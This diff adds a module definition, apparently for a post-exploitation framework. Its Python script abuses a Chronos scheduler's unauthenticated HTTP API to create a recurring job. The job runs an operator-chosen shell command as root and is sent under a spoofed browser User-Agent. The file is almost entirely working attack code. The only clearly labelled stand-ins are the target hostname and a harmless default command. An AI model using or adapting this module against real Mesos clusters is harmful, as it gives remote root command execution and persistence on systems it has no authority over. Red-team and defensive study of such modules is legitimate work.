@@ -1,0 +1,85 @@
+name: Chronos API Add Job
+authors:
+  - '@TweekFawkes'
+description: Add a Chronos job using the HTTP API service for the Chronos Framework
+software: ''
+techniques:
+  - T1106
+background: true
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - 'Docs: https://mesos.github.io/chronos/docs/api.html'
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: Target
+    description: FQDN, domain name, or hostname to lookup on the remote target.
+    required: true
+    value: chronos.mesos
+  - name: Port
+    description: The port to connect to.
+    required: true
+    value: '8080'
+  - name: Name
+    description: The name of the chronos job.
+    required: true
+    value: scheduledJob001
+  - name: Command
+    description: The command to run.
+    required: true
+    value: id
+  - name: Owner
+    description: The owner of the job.
+    required: true
+    value: admin@example.com
+  - name: OwnerName
+    description: The owner name of the job.
+    required: true
+    value: admin
+  - name: Description
+    description: The description of the job.
+    required: true
+    value: Scheduled Job 001
+  - name: Schedule
+    description: The schedule for the job.
+    required: true
+    value: R/2016-07-15T00:08:35Z/PT24H
+  - name: LastSuccess
+    description: The last successful run for the job (optional).
+    required: false
+    value: ''
+script: |
+  import urllib2
+
+  target = "{{ Target }}"
+  port = "{{ Port }}"
+  name = "{{ Name}}"
+  command = "{{ Command }}"
+  owner = "{{ Owner }}"
+  ownerName = "{{ OwnerName }}"
+  description = "{{ Description}}"
+  schedule = "{{ Schedule }}"
+  last = "{{ LastSuccess }}"
+
+  url = "http://" + target + ":" + port + "/scheduler/iso8601"
+
+  try:
+      data = '{"name":"'+name+'","command":"'+command+'","shell":true,"epsilon":"PT30M","executor":"","executorFlags":"","retries":2,"owner":"'+owner+'","ownerName":"'+ownerName+'","description":"'+description+'","async":false,"successCount":1,"errorCount":0,"lastSuccess":"'+last+'","lastError":"","cpus":0.1,"disk":256.0,"mem":128.0,"disabled":false,"softError":false,"dataProcessingJobType":false,"errorsSinceLastSuccess":0,"uris":[],"environmentVariables":[],"arguments":[],"highPriority":true,"runAsUser":"root","constraints":[],"schedule":"'+schedule+'","scheduleTimeZone":""}'
+      request = urllib2.Request(url, data)
+      request.add_header('User-Agent',
+                     'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
+                     'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
+      request.add_header('Content-Type', 'application/json')
+      opener = urllib2.build_opener(urllib2.HTTPHandler)
+      content = opener.open(request).read()
+      print(str(content))
+  except Exception as e:
+      print("Failure sending payload: " + str(e))
+
+  print("Finished")
